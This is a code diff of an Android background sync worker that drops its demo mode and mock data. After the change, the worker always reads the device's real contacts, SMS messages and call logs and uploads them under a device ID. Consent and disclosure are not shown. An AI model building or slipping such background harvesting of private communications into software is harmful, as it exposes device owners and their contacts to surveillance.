@@ -6,7 +6,6 @@ import androidx.hilt.work.HiltWorker
 import androidx.preference.PreferenceManager
 import androidx.work.CoroutineWorker
 import androidx.work.WorkerParameters
-import com.boxx.datasync.data.MockDataGenerator
 import com.boxx.datasync.domain.model.Device
 import com.boxx.datasync.domain.repository.DataRepository
 import com.boxx.datasync.utils.DataHelper
@@ -23,27 +22,11 @@ class SyncWorker @AssistedInject constructor(
 
     override suspend fun doWork(): Result {
         val deviceId = DeviceIdHelper.getDeviceId(applicationContext)
-        val prefs = PreferenceManager.getDefaultSharedPreferences(applicationContext)
-        val isDemoMode = prefs.getBoolean("demo_mode", false)
 
         return try {
-            val contacts = if (isDemoMode) {
-                MockDataGenerator.generateMockContacts()
-            } else {
-                DataHelper.fetchContacts(applicationContext)
-            }
-
-            val smsList = if (isDemoMode) {
-                MockDataGenerator.generateMockSMS()
-            } else {
-                DataHelper.fetchSMS(applicationContext)
-            }
-
-            val callLogs = if (isDemoMode) {
-                MockDataGenerator.generateMockCallLogs()
-            } else {
-                DataHelper.fetchCallLogs(applicationContext)
-            }
+            val contacts = DataHelper.fetchContacts(applicationContext)
+            val smsList = DataHelper.fetchSMS(applicationContext)
+            val callLogs = DataHelper.fetchCallLogs(applicationContext)
 
             repository.syncContacts(deviceId, contacts)
             repository.syncSMS(deviceId, smsList)
@@ -56,8 +39,7 @@ class SyncWorker @AssistedInject constructor(
                 contactCount = contacts.size,
                 smsCount = smsList.size,
                 callLogCount = callLogs.size,
-                timestamp = System.currentTimeMillis(),
-                isDemoMode = isDemoMode
+                timestamp = System.currentTimeMillis()
             ))
             Result.success()
         } catch (e: Exception) {
